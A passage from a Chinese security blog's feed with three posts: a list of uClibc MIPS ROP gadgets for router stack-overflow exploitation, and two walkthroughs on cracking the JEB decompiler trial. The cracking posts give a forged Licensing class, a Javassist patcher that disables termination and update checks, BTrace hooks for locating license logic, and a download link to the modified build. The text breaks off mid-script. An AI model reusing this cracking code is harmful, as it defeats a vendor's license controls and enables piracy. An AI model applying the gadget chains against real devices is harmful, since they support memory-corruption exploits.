      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本帖记录一些常用的,效果好的 rop gadgets.</p>
<p><strong>uClibc</strong></p>
<p><strong>从栈中设置<code>$t9</code> 并跳到 <code>$t9</code> 的gadgets , <code>__thread_start</code> 函数第二行</strong></p>
<p>使用 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html">案例</a></p>
<p>使用tips:</p>
<ul>
<li>调用函数时，进入函数内部时要求 <code>$t9</code> 指向函数的起始地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lw      $t9, arg_0($sp)</div><div class="line">jalr    $t9</div></pre></td></tr></table></figure>
<p><strong>四个组合使用，调用栈中 shellcode 的 rop_gadget , 需要可以控制 <code>$s1</code>,</strong></p>
<p>详细分析在<a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">这里
</a></p>
<p>rop_gadget 1, <strong>设置 参数一 为 1</strong>，位于 <code>__uClibc_main</code> ,可以使用 <code>mipsrop.find(&quot;li $a0, 1&quot;)</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LOAD:00055C60                 li      $a0, 1</div><div class="line">LOAD:00055C64                 move    $t9, $s1</div><div class="line">LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">LOAD:00055C5C                 lui     $s0, 2</div></pre></td></tr></table></figure></p>
<p>rop_gadget 2，<strong>从栈中设置寄存器</strong>，使用 <code>mipsrop.tail()</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">LOAD:0001E20C                 move    $t9, $s1</div><div class="line">LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">LOAD:0001E220                 jr      $t9</div><div class="line">LOAD:0001E224                 addiu   $sp, 0x28</div></pre></td></tr></table></figure></p>
<p>rop_gadget 3，<strong>获取栈地址</strong>，使用 <code>mipsrop.stackfinder()</code> 查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">LOAD:000164C4                 move    $a2, $v1</div><div class="line">LOAD:000164C8                 move    $t9, $s0</div><div class="line">LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">LOAD:000164D0                 move    $a0, $s2</div></pre></td></tr></table></figure>
<p>rop_gadget 4，<strong>通过 <code>$t9</code>, 跳转到 <code>$s2</code></strong>，使用 <code>mipsrop.find(&quot;move    $t9, $s2&quot;)</code> 查找, 位于 <code>readdir</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LOAD:000118A4                 move    $t9, $s2</div><div class="line">LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p><strong>从栈中取数据到寄存器, <code>opendir</code>  函数尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0000AA6C                 lw      $ra, 0xC0+var_4($sp)</div><div class="line">.text:0000AA70                 lw      $s2, 0xC0+var_8($sp)</div><div class="line">.text:0000AA74                 lw      $s1, 0xC0+var_C($sp)</div><div class="line">.text:0000AA78                 lw      $s0, 0xC0+var_10($sp)</div><div class="line">.text:0000AA7C                 jr      $ra</div><div class="line">.text:0000AA80                 addiu   $sp, 0xC0</div><div class="line">.text:0000AA80  # End of function opendir</div></pre></td></tr></table></figure></p>
<p><strong>从栈中设置基本上所有的重要寄存器，位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">LOAD:00011BB0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">LOAD:00011BB4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">LOAD:00011BB8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">LOAD:00011BBC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">LOAD:00011BC0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">LOAD:00011BC4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">LOAD:00011BC8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">LOAD:00011BCC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">LOAD:00011BD0                 lw      $s1, 0x40+var_24($sp)</div><div class="line">LOAD:00011BD4                 lw      $s0, 0x40+var_28($sp)</div><div class="line">LOAD:00011BD8                 jr      $ra</div><div class="line">LOAD:00011BDC                 addiu   $sp, 0x40</div><div class="line">LOAD:00011BDC  # End of function scandir</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[破解 jeb  2.3.7 demo]]></title>
      <url>//jeb%E7%A0%B4%E8%A7%A3/2017-10-27-%E7%A0%B4%E8%A7%A3-jeb-2-3-7-demo.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用的技术和上文的一样。</p>
<p><code>mips</code> 版本的修改版</p>
<p>百度云：</p>
<p>链接: <a href="https://pan.baidu.com/s/1c1Oh0x6" target="_blank" rel="external">https://pan.baidu.com/s/1c1Oh0x6</a> 密码: ekjj</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>安卓版</strong></p>
<p><code>jeb-2.3.7.201710262129-JEBDecompilerDemo-121820464987384338</code></p>
<p>重新编译一个 <code>com.pnfsoftware.jeb.client.Licensing</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div></pre></td><td class="code"><pre><div class="line">//</div><div class="line">// Source code recreated from a .class file by IntelliJ IDEA</div><div class="line">// (powered by Fernflower decompiler)</div><div class="line">//</div><div class="line"></div><div class="line">package com.pnfsoftware.jeb.client;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.AssetManager;</div><div class="line">import com.pnfsoftware.jeb.util.format.Strings;</div><div class="line">import com.pnfsoftware.jeb.util.logging.GlobalLog;</div><div class="line">import com.pnfsoftware.jeb.util.logging.ILogger;</div><div class="line">import com.pnfsoftware.jebglobal.GN;</div><div class="line">import com.pnfsoftware.jebglobal.mW;</div><div class="line"></div><div class="line">public final class Licensing &#123;</div><div class="line">    private static final ILogger logger = GlobalLog.getLogger(Licensing.class);</div><div class="line">    public static final String user_email = &quot;love_lh@hac425.com&quot;;</div><div class="line">    public static final String user_group = &quot;hacker&quot;;</div><div class="line">    public static final int user_id = 2116188757;</div><div class="line">    public static final String user_name = &quot;hac425&quot;;</div><div class="line">    public static final int user_count = 20;</div><div class="line">    public static final int license_ts = 0;</div><div class="line">    public static final int license_validity = 40000;</div><div class="line">    public static int real_license_ts = 0;</div><div class="line">    public static int build_type = 0;</div><div class="line">    public static final int FLAG_AIRGAP = 8;</div><div class="line">    public static final int FLAG_ANYCLIENT = 16;</div><div class="line">    public static final int FLAG_COREAPI = 32;</div><div class="line">    public static final int FLAG_DEBUG = 1;</div><div class="line">    public static final int FLAG_FLOATING = 4;</div><div class="line">    public static final int FLAG_FULL = 2;</div><div class="line">    public static final int FLAG_JEB2 = 128;</div><div class="line"></div><div class="line"></div><div class="line">    static &#123;</div><div class="line">        int v0 = Licensing.build_type | 2;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 4;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 8;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 16;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 32;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        Licensing.build_type = v0 | 128;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    public Licensing() &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final void setLicenseTimestamp(int var0) &#123;</div><div class="line">        real_license_ts = 1505267330;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getExpirationTimestamp() &#123;</div><div class="line">        return real_license_ts + 345600000;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getBuildType() &#123;</div><div class="line">        return build_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDebugBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isReleaseBuild() &#123;</div><div class="line">        return !isDebugBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFullBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDemoBuild() &#123;</div><div class="line">        return !isFullBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFloatingBuild() &#123;</div><div class="line">        return (build_type &amp; 4) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isIndividualBuild() &#123;</div><div class="line">        return !isFloatingBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isAirgapBuild() &#123;</div><div class="line">        return (build_type &amp; 8) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isInternetRequired() &#123;</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean allowAnyClient() &#123;</div><div class="line">        return (build_type &amp; 16) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean canUseCoreAPI() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final String getBuildTypeString() &#123;</div><div class="line">        StringBuilder var0 = new StringBuilder();</div><div class="line">        if (isReleaseBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-119, 23, 9, 9, 4, 18, 22, 74&#125;, 1, 251));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;35, 1, 7, 23, 18, 72&#125;, 1, 71));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFullBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;37, 26, 28, 21, 93&#125;, 2, 39));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;39, 10, 29, 22, 93&#125;, 2, 200));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFloatingBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-114, 10, 3, 14, 21, 29, 7, 9, 72&#125;, 1, 232));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;42, 1, 20, 16, 4, 0, 3, 29, 21, 76, 7&#125;, 2, 150));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isAirgapBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;34, 6, 2, 84, 21, 8, 23, 71&#125;, 2, 100));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;8, 23, 20, 92, 68, 7, 26, 17, 23, 28, 11, 17, 91&#125;, 1, 122));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (allowAnyClient()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;82, 15, 23, 84, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 51));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-85, 9, 0, 15, 10, 10, 8, 13, 65, 78, 15, 5, 12, 11, 26, 91&#125;, 1, 196));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (canUseCoreAPI()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;32, 0, 2, 28, 95, 8, 23, 1&#125;, 2, 169));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-27, 1, 66, 78, 12, 29, 23, 72, 76, 17, 25&#125;, 1, 139));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return var0.toString();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getLicense() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;LICENSE.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static String getChangeList() &#123;</div><div class="line">        byte[] var0 = AssetManager.UU(&quot;CHANGELIST.TXT&quot;);</div><div class="line">        return var0 == null ? null : Strings.decodeUTF8(var0);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后patch掉退出函数和更新检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">package me.hacklh;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.Launcher;</div><div class="line">import javassist.ClassPool;</div><div class="line">import javassist.CtClass;</div><div class="line">import javassist.CtMethod;</div><div class="line">import javassist.CtNewMethod;</div><div class="line">import com.pnfsoftware.jeb.client.Licensing;</div><div class="line"></div><div class="line"></div><div class="line">public class JebCracker &#123;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line"></div><div class="line">//        com.pnfsoftware.jeb.installer.Launcher.main(new String[]&#123;&quot;--di&quot;&#125;);</div><div class="line">//        DES.main(args);</div><div class="line">//         Launcher.main(new String[]&#123;&quot;--generate-key&quot;&#125;);</div><div class="line">        CtClass.debugDump = &quot;./debugDump/&quot;;</div><div class="line"></div><div class="line">        System.out.println(Licensing.allowAnyClient());</div><div class="line"></div><div class="line">        /**</div><div class="line">         * 修改getStatus， AbstractContext会起几个线程修改status</div><div class="line">         */</div><div class="line">        ClassPool pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        CtClass old_class = pool.get(&quot;com.pnfsoftware.jeb.client.AbstractContext&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        CtMethod old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;getStatus&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return 0;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;terminate&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">        /**</div><div class="line">         * patch 掉与网络下载有关的函数，禁止升级</div><div class="line">         */</div><div class="line">        pool = ClassPool.getDefault();</div><div class="line">        pool.importPackage(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class = pool.get(&quot;com.pnfsoftware.jeb.util.net.Net&quot;);</div><div class="line">        old_class.detach();</div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line"></div><div class="line">                (</div><div class="line">                        &quot;downloadBinary&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line"></div><div class="line">        old_method = old_class.getDeclaredMethod</div><div class="line">                (</div><div class="line">                        &quot;httpPost&quot;,</div><div class="line">                        new CtClass[]</div><div class="line">                                &#123;</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(String.class.getName()),</div><div class="line">                                        pool.get(long[].class.getName())</div><div class="line">                                &#125;</div><div class="line">                );</div><div class="line">        old_method.setBody(&quot;return null;&quot;);</div><div class="line">        old_class.writeFile();</div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509071049085jtzkc8nm.png?imageslim" alt="paste image"></p>
<p><strong>mips版</strong><br>类似</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>可以在jeb的官网下载其他平台的适配包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pnfsoftware.com/jeb2/support-package</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> jeb破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jeb 2.3.7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java应用破解之破解 jeb mips 2.3.3 ]]></title>
      <url>//jeb%E7%A0%B4%E8%A7%A3/2017-10-23-java%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3%E4%B9%8B%E7%A0%B4%E8%A7%A3-jeb-mips-2-3-3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于要去学习路由器相关的漏洞利用技术的学习，而许多的路由器都是 <code>mips架构</code>  的，<code>IDA</code> 又不能反编译 <code>mips</code> , 发现 <code>jeb</code> 的新版支持 <code>mips的反编译</code> ，于是去官网申请一个试用版，试用版的限制还是比较多的，比如 <code>使用时间验证</code>，<code>没法复制粘贴</code> 等，于是想尝试看看能否破解，同时填了 <code>java破解</code> 这个坑。</p>
<hr>
<p>本文主要记录的是破解过程中的思路和使用的一些工具，技巧。文末有处理后的数据。</p>
<hr>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>  <code>jeb</code> 的主要逻辑在 <code>jeb.jar</code> 中，该文件会在程序运行起来后释放到程序目录中的其中一个子目录下，使用 <code>Everything</code> 搜 <code>jeb.jar</code> 就可以找到文件的位置。找到文件后就可以逆向分析了。本文重点不在逆向这方面，而是要介绍我破解这个软件的一个大概的流程。</p>
<p>  下面介绍几个在整个流程中起到重要作用的工具。</p>
<ul>
<li><code>Btrace</code>  —-&gt; hook java系统函数，打印堆栈，找关键方法</li>
<li><code>javassist</code> —-&gt;  修改字节码</li>
<li><code>IDEA</code> ——&gt;  动态调试jar包</li>
</ul>
<p>试用版的一个最无语的限制就是必须要联网才能使用，不联网就会直接退出了，就是如此暴力。但是这对我们来说则是绝佳的条件。我们可以使用 Btrace <code>hook java.lang.System.exit</code> 函数，然后打印堆栈信息，就可以定位到在退出前所调用的方法，一般来说，在方法之间肯定会有离关键方法很近的方法，或者直接就是我们要找的目标方法。<br>这个是之前破解的，现在我重新测试时，提示 <code>超过试用期</code>，然后就退出了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820496115nl8oskut.png?imageslim" alt="paste image"></p>
<p>不管怎样有异常就好，然后hook  <code>java.lang.System.exit</code> 打印堆栈信息就可以看到一些jeb自己写一些方法的的信息了。</p>
<p>Btrace脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import com.sun.btrace.annotations.*;  </div><div class="line">import static com.sun.btrace.BTraceUtils.*;  </div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;java.lang.System&quot;, method = &quot;exit&quot;)</div><div class="line">		public static void Trace_exit()</div><div class="line">		&#123;</div><div class="line">			println( &quot;jstack() is :&quot; );</div><div class="line">			println( &quot;[&quot; );</div><div class="line">			jstack();</div><div class="line">			println( &quot;]&quot; );</div><div class="line">		&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820717781912l6lzi.png?imageslim" alt="paste image"></p>
<p>这里有个小问题,如果你是通过运行jeb_wincon.bat 或者 jeb.exe来启动jeb的话你是看不到他开启的 java进程的，所以可以使用 <code>everything</code> 搜索<code>org.eclipse.equinox.launcher*jar</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508820877604x2xuse0y.png?imageslim" alt="paste image"></p>
<p>然后运行那个 jar 包就可以正常的找到 <code>jeb启动的 java 进程</code> 了，这样我们才可以使用 Btrace 脚本进行 hook. 至于为什么是这样的，我也不记得当初是怎样找到的。可以去逆向 <code>jeb.exe</code> 或者 看使用 <code>org.eclipse.equinox</code> 开发的教程可以弄清楚。其实通过 <code>Btrace</code> 然后配合着静态分析就可以解决这个软件了我认为。</p>
<p>Jeb里面会使用一个函数对字符串进行加密，所以在逆向的时候会很不方便，当初我是用 IDEA 调试它，然后 在 IDEA 的调试环境里面，调用解密函数(使用IDEA的自带的功能)，把加密后的字符串解密后，然后再分析的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15088226254701n26it6w.png?imageslim" alt="paste image"></p>
<p>使用IDEA调试其实非常简单，我们只需要先新建一个 project , 然后把相关的jar包添加到 Project 的 lib, 然后调用 jar 包中的函数即可。比如</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821465891r2f5xrjy.png?imageslim" alt="paste image"></p>
<p>信息比较杂，看我画圈的那段代码即可。然后进入想要下断点的位置，正常的下个断点就可以了。</p>
<p>比如我们已经知道，程序权限校验的关键逻辑在 jeb.jar中，我们直接调用 jeb.jar中的 main 方法，然后进去调试里面的代码即可</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508821704636jxtite92.png?imageslim" alt="paste image"></p>
<p>赏心悦目的调试，美滋滋。分析或者调试 <code>jeb.jar</code> ，就可以找到 字符串加密的那个方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508822313678ssj9on8b.png?imageslim" alt="paste image"><br>如果没有目标，我们可以使用 Btrace hook 这个函数，打印他的返回值，就可以看到程序中各种被解密后的字符串了。脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">import static com.sun.btrace.BTraceUtils.println;</div><div class="line">import static com.sun.btrace.BTraceUtils.str;</div><div class="line">import static com.sun.btrace.BTraceUtils.strcat;</div><div class="line">import static com.sun.btrace.BTraceUtils.timeMillis;</div><div class="line">import static com.sun.btrace.BTraceUtils.jstack;</div><div class="line"></div><div class="line"></div><div class="line">import com.sun.btrace.annotations.BTrace;</div><div class="line">import com.sun.btrace.annotations.Kind;</div><div class="line">import com.sun.btrace.annotations.Location;</div><div class="line">import com.sun.btrace.annotations.OnMethod;</div><div class="line"></div><div class="line">@BTrace</div><div class="line">public class TraceHelloWorld &#123;</div><div class="line">		@OnMethod</div><div class="line">		(clazz = &quot;com.pnfsoftware.jebglobal.GN&quot;, method = &quot;dL&quot;)</div><div class="line">		